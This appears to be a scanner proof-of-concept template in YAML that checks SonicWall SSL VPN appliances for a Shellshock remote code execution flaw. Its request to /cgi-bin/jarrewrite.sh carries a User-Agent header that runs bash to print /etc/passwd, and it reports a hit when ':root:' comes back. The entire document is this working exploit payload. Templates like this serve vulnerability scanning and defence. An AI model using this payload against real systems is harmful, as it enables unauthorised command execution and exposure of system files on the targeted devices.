name: poc-yaml-sonicwall-ssl-vpn-rce
rules:
  - method: GET
    path: /cgi-bin/jarrewrite.sh
    headers:
      User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
      Connection: close
      Cache-Control: max-age=0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Sec-Fetch-Site: same-origin
      Sec-Fetch-Mode: navigate
      Sec-Fetch-User: \?1
      Sec-Fetch-Dest: document
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    expression: |
      response.status == 200 && response.body.bcontains(b":root:")
detail:
  author: sakura404x
  links:
    - https://github.com/darrenmartyn/VisualDoor/blob/main/visualdoor.py
